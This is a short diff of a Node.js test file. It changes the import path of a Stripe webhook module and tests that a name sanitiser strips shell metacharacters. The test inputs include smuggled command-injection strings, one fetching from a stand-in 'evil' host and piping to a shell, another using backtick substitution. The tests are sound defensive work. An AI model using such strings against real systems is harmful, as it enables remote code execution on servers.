@@ -1,6 +1,6 @@
 import { test } from 'node:test';
 import assert from 'node:assert';
-import { safeName, mintCommand } from './stripe-webhook.mjs';
+import { safeName, mintCommand } from '../../netlify/functions/stripe-webhook.mjs';
 test('safeName strips shell metacharacters', () => {
   assert.equal(safeName('Rob $(curl evil|sh)'), 'Rob curl evilsh');
   assert.equal(safeName('a`id`b'), 'aidb');
